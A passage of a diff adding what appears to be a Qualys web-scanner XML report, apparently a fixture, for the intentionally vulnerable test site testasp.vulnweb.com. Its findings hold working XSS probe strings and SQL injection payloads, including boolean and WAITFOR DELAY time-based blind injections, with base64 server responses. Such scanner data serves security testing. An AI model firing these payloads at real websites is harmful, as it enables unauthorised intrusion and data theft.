+                    <result base64="true"><![CDATA[ICZsdDtmb250IGZhY2U9IkFyaWFsIiBzaXplPTImZ3Q7CiZsdDtwJmd0O01pY3Jvc29mdCBTUUwgTmF0aXZlIENsaWVudCZsdDsvZm9udCZndDsgJmx0O2ZvbnQgZmFjZT0iQXJpYWwiIHNpemU9MiZndDtlcnJvciAnODAwNDBlMTQnJmx0Oy9mb250Jmd0OwombHQ7cCZndDsKJmx0O2ZvbnQgZmFjZT0iQXJpYWwiIHNpemU9MiZndDtJbmNvcnJlY3Qgc3ludGF4IG5lYXIgJyZndDsnLiZsdDsvZm9udCZndDsKJmx0O3AmZ3Q7CiZsdDtmb250IGZhY2U9IkFyaWFsIiBzaXplPTImZ3Q7L0xvZ2luLmFzcCZsdDsvZm9udCZndDsmbHQ7Zm9udCBmYWNlPSJBcmlhbCIgc2l6ZT0yJmd0OywgbGluZSAxMCZsdDsvZm9udCZndDsg]]></result>
+                  </WasScanVulnPayload>
+                  <WasScanVulnPayload>
+                    <payload><![CDATA["'><qss>]]></payload>
+                    <result base64="true"><![CDATA[ICZsdDtmb250IGZhY2U9IkFyaWFsIiBzaXplPTImZ3Q7CiZsdDtwJmd0O01pY3Jvc29mdCBTUUwgTmF0aXZlIENsaWVudCZsdDsvZm9udCZndDsgJmx0O2ZvbnQgZmFjZT0iQXJpYWwiIHNpemU9MiZndDtlcnJvciAnODAwNDBlMTQnJmx0Oy9mb250Jmd0OwombHQ7cCZndDsKJmx0O2ZvbnQgZmFjZT0iQXJpYWwiIHNpemU9MiZndDtJbmNvcnJlY3Qgc3ludGF4IG5lYXIgJyZndDsnLiZsdDsvZm9udCZndDsKJmx0O3AmZ3Q7CiZsdDtmb250IGZhY2U9IkFyaWFsIiBzaXplPTImZ3Q7L0xvZ2luLmFzcCZsdDsvZm9udCZndDsmbHQ7Zm9udCBmYWNlPSJBcmlhbCIgc2l6ZT0yJmd0OywgbGluZSAxMCZsdDsvZm9udCZndDsg]]></result>
+                  </WasScanVulnPayload>
+                  <WasScanVulnPayload>
+                    <payload><![CDATA["'><<SCRIPT%20a=2>qss=7;//<</SCRIPT>]]></payload>
+                    <result base64="true"><![CDATA[ICZsdDtmb250IGZhY2U9IkFyaWFsIiBzaXplPTImZ3Q7CiZsdDtwJmd0O01pY3Jvc29mdCBTUUwgTmF0aXZlIENsaWVudCZsdDsvZm9udCZndDsgJmx0O2ZvbnQgZmFjZT0iQXJpYWwiIHNpemU9MiZndDtlcnJvciAnODAwNDBlMTQnJmx0Oy9mb250Jmd0OwombHQ7cCZndDsKJmx0O2ZvbnQgZmFjZT0iQXJpYWwiIHNpemU9MiZndDtJbmNvcnJlY3Qgc3ludGF4IG5lYXIgJyZndDsnLiZsdDsvZm9udCZndDsKJmx0O3AmZ3Q7CiZsdDtmb250IGZhY2U9IkFyaWFsIiBzaXplPTImZ3Q7L0xvZ2luLmFzcCZsdDsvZm9udCZndDsmbHQ7Zm9udCBmYWNlPSJBcmlhbCIgc2l6ZT0yJmd0OywgbGluZSAxMCZsdDsvZm9udCZndDsg]]></result>
+                  </WasScanVulnPayload>
+                  <WasScanVulnPayload>
+                    <payload><![CDATA["'><qss%20a=@REQUESTID@>]]></payload>
+                    <result base64="true"><![CDATA[ICZsdDtmb250IGZhY2U9IkFyaWFsIiBzaXplPTImZ3Q7CiZsdDtwJmd0O01pY3Jvc29mdCBTUUwgTmF0aXZlIENsaWVudCZsdDsvZm9udCZndDsgJmx0O2ZvbnQgZmFjZT0iQXJpYWwiIHNpemU9MiZndDtlcnJvciAnODAwNDBlMTQnJmx0Oy9mb250Jmd0OwombHQ7cCZndDsKJmx0O2ZvbnQgZmFjZT0iQXJpYWwiIHNpemU9MiZndDtJbmNvcnJlY3Qgc3ludGF4IG5lYXIgJyZndDsnLiZsdDsvZm9udCZndDsKJmx0O3AmZ3Q7CiZsdDtmb250IGZhY2U9IkFyaWFsIiBzaXplPTImZ3Q7L0xvZ2luLmFzcCZsdDsvZm9udCZndDsmbHQ7Zm9udCBmYWNlPSJBcmlhbCIgc2l6ZT0yJmd0OywgbGluZSAxMCZsdDsvZm9udCZndDsg]]></result>
+                  </WasScanVulnPayload>
+                </list>
+              </payloads>
+            </WasScanVulnInstance>
+          </list>
+        </instances>
+      </WasScanVuln>
+      <WasScanVuln>
+        <qid>150003</qid>
+        <title><![CDATA[SQL Injection]]></title>
+        <uri><![CDATA[http://testasp.vulnweb.com/Login.asp?RetURL=%2FDefault.asp%3F]]></uri>
+        <param>tfUPass</param>
+        <instances>
+          <count>1</count>
+          <list>
+            <WasScanVulnInstance>
+              <authenticated>false</authenticated>
+              <form><![CDATA[http://testasp.vulnweb.com/Login.asp?RetURL=%2FDefault.asp%3F]]></form>
+              <payloads>
+                <count>2</count>
+                <list>
+                  <WasScanVulnPayload>
+                    <payload><![CDATA[tfUName=John&tfUPass=password']]></payload>
+                    <result base64="true"><![CDATA[ICZsdDtmb250IGZhY2U9IkFyaWFsIiBzaXplPTImZ3Q7CiZsdDtwJmd0O01pY3Jvc29mdCBTUUwgTmF0aXZlIENsaWVudCZsdDsvZm9udCZndDsgJmx0O2ZvbnQgZmFjZT0iQXJpYWwiIHNpemU9MiZndDtlcnJvciAnODAwNDBlMTQnJmx0Oy9mb250Jmd0OwombHQ7cCZndDsKJmx0O2ZvbnQgZmFjZT0iQXJpYWwiIHNpemU9MiZndDtVbmNsb3NlZCBxdW90YXRpb24gbWFyayBhZnRlciB0aGUgY2hhcmFjdGVyIHN0cmluZyAncGFzc3dvcmQnJy4mbHQ7L2ZvbnQmZ3Q7CiZsdDtwJmd0OwombHQ7Zm9udCBmYWNlPSJBcmlhbCIgc2l6ZT0yJmd0Oy9Mb2dpbi5hc3AmbHQ7L2ZvbnQmZ3Q7Jmx0O2ZvbnQgZmFjZT0iQXJpYWwiIHNpemU9MiZndDssIGxpbmUgMTAmbHQ7L2ZvbnQmZ3Q7IA]]></result>
+                  </WasScanVulnPayload>
+                  <WasScanVulnPayload>
+                    <payload><![CDATA[tfUName=John&tfUPass=password']]></payload>
+                    <result base64="true"><![CDATA[ICZsdDtmb250IGZhY2U9IkFyaWFsIiBzaXplPTImZ3Q7CiZsdDtwJmd0O01pY3Jvc29mdCBTUUwgTmF0aXZlIENsaWVudCZsdDsvZm9udCZndDsgJmx0O2ZvbnQgZmFjZT0iQXJpYWwiIHNpemU9MiZndDtlcnJvciAnODAwNDBlMTQnJmx0Oy9mb250Jmd0OwombHQ7cCZndDsKJmx0O2ZvbnQgZmFjZT0iQXJpYWwiIHNpemU9MiZndDtVbmNsb3NlZCBxdW90YXRpb24gbWFyayBhZnRlciB0aGUgY2hhcmFjdGVyIHN0cmluZyAncGFzc3dvcmQnJy4mbHQ7L2ZvbnQmZ3Q7CiZsdDtwJmd0OwombHQ7Zm9udCBmYWNlPSJBcmlhbCIgc2l6ZT0yJmd0Oy9Mb2dpbi5hc3AmbHQ7L2ZvbnQmZ3Q7Jmx0O2ZvbnQgZmFjZT0iQXJpYWwiIHNpemU9MiZndDssIGxpbmUgMTAmbHQ7L2ZvbnQmZ3Q7IA]]></result>
+                  </WasScanVulnPayload>
+                </list>
+              </payloads>
+            </WasScanVulnInstance>
+          </list>
+        </instances>
+      </WasScanVuln>
+      <WasScanVuln>
+        <qid>150001</qid>
+        <title><![CDATA[Reflected Cross-Site Scripting (XSS) Vulnerabilities]]></title>
+        <uri><![CDATA[http://testasp.vulnweb.com/Login.asp?RetURL=%2FDefault.asp%3F]]></uri>
+        <param>tfUName</param>
+        <instances>
+          <count>1</count>
+          <list>
+            <WasScanVulnInstance>
+              <authenticated>false</authenticated>
+              <form><![CDATA[http://testasp.vulnweb.com/Login.asp?RetURL=%2FDefault.asp%3F]]></form>
+              <payloads>
+                <count>2</count>
+                <list>
+                  <WasScanVulnPayload>
+                    <payload><![CDATA[tfUName=%22%3E%3Cqss%3E&tfUPass=password]]></payload>
+                    <result base64="true"><![CDATA[IiZndDsmbHQ7YSBocmVmPSJUZW1wbGF0aXplLmFzcD9pdGVtPWh0bWwvYWJvdXQuaHRtbCIgY2xhc3M9Im1lbnUiJmd0O2Fib3V0Jmx0Oy9hJmd0OyAtICZsdDthIGhyZWY9IkRlZmF1bHQuYXNwIiBjbGFzcz0ibWVudSImZ3Q7Zm9ydW1zJmx0Oy9hJmd0OyAtICZsdDthIGhyZWY9IlNlYXJjaC5hc3AiIGNsYXNzPSJtZW51IiZndDtzZWFyY2gmbHQ7L2EmZ3Q7IA0KICAgICAtICZsdDthIGhyZWY9Ii4vTG9nb3V0LmFzcD9SZXRVUkw9JTJGRGVmYXVsdCUyRWFzcCUzRiIgY2xhc3M9Im1lbnUiJmd0O2xvZ291dCAiJmd0OyZsdDtxc3MmZ3Q7Jmx0Oy9hJmd0OyANCiAgICAmbHQ7L2RpdiZndDsmbHQ7L3RkJmd0OyANCiAgJmx0Oy90ciZndDsgDQogICZsdDt0ciZndDsgDQogICAgJmx0O3RkIGNvbHNwYW49IjIiJmd0OyZsdDshLS0gSW5zdGFuY2VCZWdpbkVkaXRhYmxlIG5hbWU9Ik1haW5Db250ZW50TGVmdCIgLS0mZ3Q7DQoJJmx0O3RhYmxlIHdpZHRoPSIxMDAlIiBib3JkZXI9IjAiIGNlbGxzcGFjaW5nPSIwIiBjZWxscGFkZGluZz0iNSImZ3Q7DQogICAgICAmbHQ7dHImZ3Q7DQogICAgICAgICZsdDt0ZCBjbGFzcz0idGFibGVoZWFkZXIiJmd0O0ZvcnVtJmx0Oy90ZCZndDsNCiAgICAgICA]]></result>
+                  </WasScanVulnPayload>
+                  <WasScanVulnPayload>
+                    <payload><![CDATA[tfUName=z--%3E%3Cqss%3E&tfUPass=password]]></payload>
+                    <result base64="true"><![CDATA[Jmx0O2EgaHJlZj0iVGVtcGxhdGl6ZS5hc3A_aXRlbT1odG1sL2Fib3V0Lmh0bWwiIGNsYXNzPSJtZW51IiZndDthYm91dCZsdDsvYSZndDsgLSAmbHQ7YSBocmVmPSJEZWZhdWx0LmFzcCIgY2xhc3M9Im1lbnUiJmd0O2ZvcnVtcyZsdDsvYSZndDsgLSAmbHQ7YSBocmVmPSJTZWFyY2guYXNwIiBjbGFzcz0ibWVudSImZ3Q7c2VhcmNoJmx0Oy9hJmd0OyANCiAgICAgLSAmbHQ7YSBocmVmPSIuL0xvZ291dC5hc3A_UmV0VVJMPSUyRkRlZmF1bHQlMkVhc3AlM0YiIGNsYXNzPSJtZW51IiZndDtsb2dvdXQgei0tJmd0OyZsdDtxc3MmZ3Q7Jmx0Oy9hJmd0OyANCiAgICAmbHQ7L2RpdiZndDsmbHQ7L3RkJmd0OyANCiAgJmx0Oy90ciZndDsgDQogICZsdDt0ciZndDsgDQogICAgJmx0O3RkIGNvbHNwYW49IjIiJmd0OyZsdDshLS0gSW5zdGFuY2VCZWdpbkVkaXRhYmxlIG5hbWU9Ik1haW5Db250ZW50TGVmdCIgLS0mZ3Q7DQoJJmx0O3RhYmxlIHdpZHRoPSIxMDAlIiBib3JkZXI9IjAiIGNlbGxzcGFjaW5nPSIwIiBjZWxscGFkZGluZz0iNSImZ3Q7DQogICAgICAmbHQ7dHImZ3Q7DQogICAgICAgICZsdDt0ZCBjbGFzcz0idGFibGVoZWFkZXIiJmd0O0ZvcnVtJmx0Oy90ZCZndDsNCiAgICAgICA]]></result>
+                  </WasScanVulnPayload>
+                </list>
+              </payloads>
+            </WasScanVulnInstance>
+          </list>
+        </instances>
+      </WasScanVuln>
+      <WasScanVuln>
+        <qid>150001</qid>
+        <title><![CDATA[Reflected Cross-Site Scripting (XSS) Vulnerabilities]]></title>
+        <uri><![CDATA[http://testasp.vulnweb.com/Login.asp?RetURL=%2FDefault.asp%3F]]></uri>
+        <param>tfUPass</param>
+        <instances>
+          <count>1</count>
+          <list>
+            <WasScanVulnInstance>
+              <authenticated>false</authenticated>
+              <form><![CDATA[http://testasp.vulnweb.com/Login.asp?RetURL=%2FDefault.asp%3F]]></form>
+              <payloads>
+                <count>2</count>
+                <list>
+                  <WasScanVulnPayload>
+                    <payload><![CDATA[tfUName=John&tfUPass=z--%3E%3Cqss%3E]]></payload>
+                    <result base64="true"><![CDATA[Jmx0O2EgaHJlZj0iVGVtcGxhdGl6ZS5hc3A_aXRlbT1odG1sL2Fib3V0Lmh0bWwiIGNsYXNzPSJtZW51IiZndDthYm91dCZsdDsvYSZndDsgLSAmbHQ7YSBocmVmPSJEZWZhdWx0LmFzcCIgY2xhc3M9Im1lbnUiJmd0O2ZvcnVtcyZsdDsvYSZndDsgLSAmbHQ7YSBocmVmPSJTZWFyY2guYXNwIiBjbGFzcz0ibWVudSImZ3Q7c2VhcmNoJmx0Oy9hJmd0OyANCiAgICAgLSAmbHQ7YSBocmVmPSIuL0xvZ291dC5hc3A_UmV0VVJMPSUyRkRlZmF1bHQlMkVhc3AlM0YiIGNsYXNzPSJtZW51IiZndDtsb2dvdXQgei0tJmd0OyZsdDtxc3MmZ3Q7Jmx0Oy9hJmd0OyANCiAgICAmbHQ7L2RpdiZndDsmbHQ7L3RkJmd0OyANCiAgJmx0Oy90ciZndDsgDQogICZsdDt0ciZndDsgDQogICAgJmx0O3RkIGNvbHNwYW49IjIiJmd0OyZsdDshLS0gSW5zdGFuY2VCZWdpbkVkaXRhYmxlIG5hbWU9Ik1haW5Db250ZW50TGVmdCIgLS0mZ3Q7DQoJCSZsdDtmb3JtIGFjdGlvbj0iIiBtZXRob2Q9IlBPU1QiJmd0Ow0KCQkmbHQ7dGFibGUgd2lkdGg9IjM1MCIgYm9yZGVyPSIwIiBhbGlnbj0iY2VudGVyIiBjZWxscGFkZGluZz0iMCIgY2VsbHNwYWNpbmc9IjUiIGNsYXNzPSJGcmFtZWRGb3I]]></result>
+                  </WasScanVulnPayload>
+                  <WasScanVulnPayload>
+                    <payload><![CDATA[tfUName=John&tfUPass=%22%3E%3Cqss%3E]]></payload>
+                    <result base64="true"><![CDATA[IiZndDsmbHQ7YSBocmVmPSJUZW1wbGF0aXplLmFzcD9pdGVtPWh0bWwvYWJvdXQuaHRtbCIgY2xhc3M9Im1lbnUiJmd0O2Fib3V0Jmx0Oy9hJmd0OyAtICZsdDthIGhyZWY9IkRlZmF1bHQuYXNwIiBjbGFzcz0ibWVudSImZ3Q7Zm9ydW1zJmx0Oy9hJmd0OyAtICZsdDthIGhyZWY9IlNlYXJjaC5hc3AiIGNsYXNzPSJtZW51IiZndDtzZWFyY2gmbHQ7L2EmZ3Q7IA0KICAgICAtICZsdDthIGhyZWY9Ii4vTG9nb3V0LmFzcD9SZXRVUkw9JTJGRGVmYXVsdCUyRWFzcCUzRiIgY2xhc3M9Im1lbnUiJmd0O2xvZ291dCAiJmd0OyZsdDtxc3MmZ3Q7Jmx0Oy9hJmd0OyANCiAgICAmbHQ7L2RpdiZndDsmbHQ7L3RkJmd0OyANCiAgJmx0Oy90ciZndDsgDQogICZsdDt0ciZndDsgDQogICAgJmx0O3RkIGNvbHNwYW49IjIiJmd0OyZsdDshLS0gSW5zdGFuY2VCZWdpbkVkaXRhYmxlIG5hbWU9Ik1haW5Db250ZW50TGVmdCIgLS0mZ3Q7DQoJCSZsdDtmb3JtIGFjdGlvbj0iIiBtZXRob2Q9IlBPU1QiJmd0Ow0KCQkmbHQ7dGFibGUgd2lkdGg9IjM1MCIgYm9yZGVyPSIwIiBhbGlnbj0iY2VudGVyIiBjZWxscGFkZGluZz0iMCIgY2VsbHNwYWNpbmc9IjUiIGNsYXNzPSJGcmFtZWRGb3I]]></result>
+                  </WasScanVulnPayload>
+                </list>
+              </payloads>
+            </WasScanVulnInstance>
+          </list>
+        </instances>
+      </WasScanVuln>
+      <WasScanVuln>
+        <qid>150112</qid>
+        <title><![CDATA[Sensitive form field has not disabled autocomplete]]></title>
+        <uri><![CDATA[http://testasp.vulnweb.com/Login.asp?RetURL=%2FDefault.asp%3F]]></uri>
+        <instances>
+          <count>1</count>
+          <list>
+            <WasScanVulnInstance>
+              <authenticated>false</authenticated>
+              <payloads>
+                <count>1</count>
+                <list>
+                  <WasScanVulnPayload>
+                    <payload><![CDATA[N/A]]></payload>
+                    <result base64="true"><![CDATA[Rm9ybSBmaWVsZCBkb2VzIG5vdCBzZXQgYXV0b2NvbXBsZXRlPSJvZmYiLg]]></result>
+                  </WasScanVulnPayload>
+                </list>
+              </payloads>
+            </WasScanVulnInstance>
+          </list>
+        </instances>
+      </WasScanVuln>
+      <WasScanVuln>
+        <qid>150053</qid>
+        <title><![CDATA[Login Form Is Not Submitted Via HTTPS ]]></title>
+        <uri><![CDATA[http://testasp.vulnweb.com/Login.asp?RetURL=%2FDefault.asp%3F]]></uri>
+        <instances>
+          <count>1</count>
+          <list>
+            <WasScanVulnInstance>
+              <authenticated>false</authenticated>
+              <payloads>
+                <count>1</count>
+                <list>
+                  <WasScanVulnPayload>
+                    <payload><![CDATA[N/A]]></payload>
+                    <result base64="true"><![CDATA[TG9naW4gRm9ybSBJcyBOb3QgU3VibWl0dGVkIFZpYSBIVFRQUwo]]></result>
+                  </WasScanVulnPayload>
+                </list>
+              </payloads>
+            </WasScanVulnInstance>
+          </list>
+        </instances>
+      </WasScanVuln>
+      <WasScanVuln>
+        <qid>150081</qid>
+        <title><![CDATA[X-Frame-Options header is not set]]></title>
+        <uri><![CDATA[http://testasp.vulnweb.com/Login.asp?RetURL=%2FDefault.asp%3F]]></uri>
+        <instances>
+          <count>1</count>
+          <list>
+            <WasScanVulnInstance>
+              <authenticated>false</authenticated>
+              <payloads>
+                <count>2</count>
+                <list>
+                  <WasScanVulnPayload>
+                    <payload><![CDATA[N/A]]></payload>
+                    <result base64="true"><![CDATA[VGhlIHJlc3BvbnNlIGZvciB0aGlzIHJlcXVlc3QgZGlkIG5vdCBoYXZlIGFuICJYLUZSQU1FLU9QVElPTlMiIGhlYWRlciBwcmVzZW50Lgo]]></result>
+                  </WasScanVulnPayload>
+                  <WasScanVulnPayload>
+                    <payload><![CDATA[N/A]]></payload>
+                    <result base64="true"><![CDATA[VGhlIHJlc3BvbnNlIGZvciB0aGlzIHJlcXVlc3QgZGlkIG5vdCBoYXZlIGFuICJYLUZSQU1FLU9QVElPTlMiIGhlYWRlciBwcmVzZW50Lgo]]></result>
+                  </WasScanVulnPayload>
+                </list>
+              </payloads>
+            </WasScanVulnInstance>
+          </list>
+        </instances>
+      </WasScanVuln>
+      <WasScanVuln>
+        <qid>150124</qid>
+        <title><![CDATA[Framable Page]]></title>
+        <uri><![CDATA[http://testasp.vulnweb.com/Login.asp?RetURL=%2FDefault.asp%3F]]></uri>
+        <instances>
+          <count>1</count>
+          <list>
+            <WasScanVulnInstance>
+              <authenticated>false</authenticated>
+              <payloads>
+                <count>2</count>
+                <list>
+                  <WasScanVulnPayload>
+                    <payload><![CDATA[N/A]]></payload>
+                    <result base64="true"><![CDATA[VGhlIFVSSSB3YXMgZnJhbWVkLgo]]></result>
+                  </WasScanVulnPayload>
+                  <WasScanVulnPayload>
+                    <payload><![CDATA[N/A]]></payload>
+                    <result base64="true"><![CDATA[VGhlIFVSSSB3YXMgZnJhbWVkLgo]]></result>
+                  </WasScanVulnPayload>
+                </list>
+              </payloads>
+            </WasScanVulnInstance>
+          </list>
+        </instances>
+      </WasScanVuln>
+      <WasScanVuln>
+        <qid>150123</qid>
+        <title><![CDATA[Cookie Does Not Contain The "HTTPOnly" Attribute]]></title>
+        <uri><![CDATA[http://testasp.vulnweb.com/]]></uri>
+        <instances>
+          <count>1</count>
+          <list>
+            <WasScanVulnInstance>
+              <authenticated>false</authenticated>
+              <payloads>
+                <count>1</count>
+                <list>
+                  <WasScanVulnPayload>
+                    <payload><![CDATA[N/A]]></payload>
+                    <result base64="true"><![CDATA[QVNQU0VTU0lPTklEU0FBRENDVFQ9RkxLR0NCT0RNQUNET0JES0pDQktLS0JJOyBwYXRoPS87IGRvbWFpbj10ZXN0YXNwLnZ1bG53ZWIuY29t]]></result>
+                  </WasScanVulnPayload>
+                </list>
+              </payloads>
+            </WasScanVulnInstance>
+          </list>
+        </instances>
+      </WasScanVuln>
+      <WasScanVuln>
+        <qid>150122</qid>
+        <title><![CDATA[Cookie Does Not Contain The "secure" Attribute]]></title>
+        <uri><![CDATA[http://testasp.vulnweb.com/]]></uri>
+        <instances>
+          <count>1</count>
+          <list>
+            <WasScanVulnInstance>
+              <authenticated>false</authenticated>
+              <payloads>
+                <count>1</count>
+                <list>
+                  <WasScanVulnPayload>
+                    <payload><![CDATA[N/A]]></payload>
+                    <result base64="true"><![CDATA[QVNQU0VTU0lPTklEU0FBRENDVFQ9RkxLR0NCT0RNQUNET0JES0pDQktLS0JJOyBwYXRoPS87IGRvbWFpbj10ZXN0YXNwLnZ1bG53ZWIuY29t]]></result>
+                  </WasScanVulnPayload>
+                </list>
+              </payloads>
+            </WasScanVulnInstance>
+          </list>
+        </instances>
+      </WasScanVuln>
+      <WasScanVuln>
+        <qid>150081</qid>
+        <title><![CDATA[X-Frame-Options header is not set]]></title>
+        <uri><![CDATA[http://testasp.vulnweb.com/]]></uri>
+        <instances>
+          <count>1</count>
+          <list>
+            <WasScanVulnInstance>
+              <authenticated>false</authenticated>
+              <payloads>
+                <count>1</count>
+                <list>
+                  <WasScanVulnPayload>
+                    <payload><![CDATA[N/A]]></payload>
+                    <result base64="true"><![CDATA[VGhlIHJlc3BvbnNlIGZvciB0aGlzIHJlcXVlc3QgZGlkIG5vdCBoYXZlIGFuICJYLUZSQU1FLU9QVElPTlMiIGhlYWRlciBwcmVzZW50Lgo]]></result>
+                  </WasScanVulnPayload>
+                </list>
+              </payloads>
+            </WasScanVulnInstance>
+          </list>
+        </instances>
+      </WasScanVuln>
+      <WasScanVuln>
+        <qid>150124</qid>
+        <title><![CDATA[Framable Page]]></title>
+        <uri><![CDATA[http://testasp.vulnweb.com/]]></uri>
+        <instances>
+          <count>1</count>
+          <list>
+            <WasScanVulnInstance>
+              <authenticated>false</authenticated>
+              <payloads>
+                <count>1</count>
+                <list>
+                  <WasScanVulnPayload>
+                    <payload><![CDATA[N/A]]></payload>
+                    <result base64="true"><![CDATA[VGhlIFVSSSB3YXMgZnJhbWVkLgo]]></result>
+                  </WasScanVulnPayload>
+                </list>
+              </payloads>
+            </WasScanVulnInstance>
+          </list>
+        </instances>
+      </WasScanVuln>
+      <WasScanVuln>
+        <qid>150012</qid>
+        <title><![CDATA[Blind SQL Injection]]></title>
+        <uri><![CDATA[http://testasp.vulnweb.com/Register.asp?RetURL=%2FDefault.asp%3F]]></uri>
+        <param>tfEmail</param>
+        <instances>
+          <count>1</count>
+          <list>
+            <WasScanVulnInstance>
+              <authenticated>false</authenticated>
+              <form><![CDATA[http://testasp.vulnweb.com/Register.asp?RetURL=%2FDefault.asp%3F]]></form>
+              <payloads>
+                <count>3</count>
+                <list>
+                  <WasScanVulnPayload>
+                    <payload><![CDATA[tfUName=John&tfRName=John&tfEmail=was@qualys.com'%20OR%20't'%3D't&tfUPass=password]]></payload>
+                    <result base64="true"><![CDATA[VGhpcyB2dWxuZXJhYmlsaXR5IHdhcyBpZGVudGlmaWVkIHVzaW5nIHRoZSBkaWZmZXJlbmNlIGluIHJlc3BvbnNlcyBmb3IgVFJVRSBhbmQgRkFMU0UgcGF5bG9hZHMuIFRoaXMgdnVsbmVyYWJpbGl0eSBpcyBjb25maXJtZWQgYmFzZWQgb24gdGhlIGRpZmZlcmVuY2UgaW4gdGhlIHJlc3BvbnNlIGNvbnRlbnQuCgpDb250ZW50IG9mIGFsbCBUUlVFIHJlc3BvbnNlcyBkaWZmZXIgZnJvbSBGQUxTRSByZXNwb25zZXMuCgpUcnVlIGNvbmRpdGlvbjoKCmh0dHA6Ly90ZXN0YXNwLnZ1bG53ZWIuY29tL1JlZ2lzdGVyLmFzcD9SZXRVUkw9JTJGRGVmYXVsdC5hc3AlM0YKCkJPRFkKdGZVTmFtZT1Kb2huJnRmUk5hbWU9Sm9obiZ0ZkVtYWlsPXdhc0BxdWFseXMuY29tJyUyME9SJTIwJ3QnJTNEJ3QmdGZVUGFzcz1wYXNzd29yZAoKRmFsc2UgY29uZGl0aW9uOgoKaHR0cDovL3Rlc3Rhc3AudnVsbndlYi5jb20vUmVnaXN0ZXIuYXNwP1JldFVSTD0lMkZEZWZhdWx0LmFzcCUzRgoKQk9EWQp0ZlVOYW1lPUpvaG4mdGZSTmFtZT1Kb2huJnRmRW1haWw9d2FzQHF1YWx5cy5jb20nJTIwQU5EJTIwJ3gnJTNEJ3QmdGZVUGFzcz1wYXNzd29yZA]]></result>
+                  </WasScanVulnPayload>
+                  <WasScanVulnPayload>
+                    <payload><![CDATA[%27%2C0%2C0%29;WAITFOR%20DELAY%27@DELAY_HMS@%27--%20]]></payload>
+                    <result base64="true"><![CDATA[Y29tbWVudDogKFRpbWVzIGFyZSBleHByZXNzZWQgaW4gbWlsbGlzZWNvbmRzLikKRXhwZWN0ZWQgcmVzcG9uc2UgZGVsYXk6IDI4MTgyCk9ic2VydmVkIHJlc3BvbnNlIGRlbGF5OiAyODE3OQpNZWFuIHJlc3BvbnNlIHRpbWU6IDE4MgpTdGFuZGFyZCBkZXZpYXRpb246IDgwCk51bWJlciBvZiBzdGRkZXYgZnJvbSBtZWFuOiAzNDYuOTY1MTcxCgpUaGlzIHZ1bG5lcmFiaWxpdHkgd2FzIGlkZW50aWZpZWQgdXNpbmcgdGltZS1iYXNlZCBpbmZlcmVuY2UgdGhhdCBjb21wYXJlZCB0aGUgYXZlcmFnZSByZXNwb25zZSB0aW1lIG9mIGEgcGFnZSB0byBpdHMgcmVzcG9uc2UgdGltZSB3aXRoIGFuIGluamVjdGVkIHBheWxvYWQuIFRoaXMgdnVsbmVyYWJpbGl0eSBpcyBjb25maXJtZWQgYmFzZWQgb24gdGltaW5nIHJhdGhlciB0aGFuIHRoZSBjb250ZW50IG9mIHRoZSByZXNwb25zZS4K]]></result>
+                  </WasScanVulnPayload>
+                  <WasScanVulnPayload>
+                    <payload><![CDATA[tfUName=John&tfRName=John&tfEmail=was@qualys.com'%20OR%203%3D3--%20&tfUPass=password]]></payload>
+                    <result base64="true"><![CDATA[VGhpcyB2dWxuZXJhYmlsaXR5IHdhcyBpZGVudGlmaWVkIHVzaW5nIHRoZSBkaWZmZXJlbmNlIGluIHJlc3BvbnNlcyBmb3IgVFJVRSBhbmQgRkFMU0UgcGF5bG9hZHMuIFRoaXMgdnVsbmVyYWJpbGl0eSBpcyBjb25maXJtZWQgYmFzZWQgb24gdGhlIGRpZmZlcmVuY2UgaW4gdGhlIHJlc3BvbnNlIGNvbnRlbnQuCgpDb250ZW50IG9mIGFsbCBUUlVFIHJlc3BvbnNlcyBkaWZmZXIgZnJvbSBGQUxTRSByZXNwb25zZXMuCgpUcnVlIGNvbmRpdGlvbjoKCmh0dHA6Ly90ZXN0YXNwLnZ1bG53ZWIuY29tL1JlZ2lzdGVyLmFzcD9SZXRVUkw9JTJGRGVmYXVsdC5hc3AlM0YKCkJPRFkKdGZVTmFtZT1Kb2huJnRmUk5hbWU9Sm9obiZ0ZkVtYWlsPXdhc0BxdWFseXMuY29tJyUyME9SJTIwMyUzRDMtLSUyMCZ0ZlVQYXNzPXBhc3N3b3JkCgpGYWxzZSBjb25kaXRpb246CgpodHRwOi8vdGVzdGFzcC52dWxud2ViLmNvbS9SZWdpc3Rlci5hc3A_UmV0VVJMPSUyRkRlZmF1bHQuYXNwJTNGCgpCT0RZCnRmVU5hbWU9Sm9obiZ0ZlJOYW1lPUpvaG4mdGZFbWFpbD13YXNAcXVhbHlzLmNvbSclMjBBTkQlMjAzJTNENC0tJTIwJnRmVVBhc3M9cGFzc3dvcmQ]]></result>
+                  </WasScanVulnPayload>
+                </list>
+              </payloads>
+            </WasScanVulnInstance>
+          </list>
+        </instances>
+      </WasScanVuln>
+      <WasScanVuln>
+        <qid>150012</qid>
+        <title><![CDATA[Blind SQL Injection]]></title>
+        <uri><![CDATA[http://testasp.vulnweb.com/Register.asp?RetURL=%2FDefault.asp%3F]]></uri>
+        <param>tfUName</param>
+        <instances>
+          <count>1</count>
+          <list>
+            <WasScanVulnInstance>
+              <authenticated>false</authenticated>
+              <form><![CDATA[http://testasp.vulnweb.com/Register.asp?RetURL=%2FDefault.asp%3F]]></form>
+              <payloads>
+                <count>2</count>
+                <list>
+                  <WasScanVulnPayload>
+                    <payload><![CDATA[tfUName=John'%20OR%20't'%3D't&tfRName=John&tfEmail=was@qualys.com&tfUPass=password]]></payload>
